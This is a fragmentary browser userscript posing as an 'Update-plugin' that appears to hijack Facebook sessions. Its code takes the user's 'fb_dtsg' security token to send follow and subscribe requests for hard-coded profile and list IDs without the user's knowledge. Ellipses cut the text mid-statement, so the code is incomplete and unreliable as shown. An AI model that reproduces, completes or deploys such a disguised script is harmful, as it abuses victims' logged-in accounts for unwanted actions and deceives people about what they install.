    ...
    // ==UserScript==
    // @name Update-plugin-05041981 v1
    // @description Update-plugin-05041981 v1
    ...
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + 
...
uidss + " }).send();";
    ...
    a("1309960759");
 sublist("623520957672682");
sublist("481046978649950");
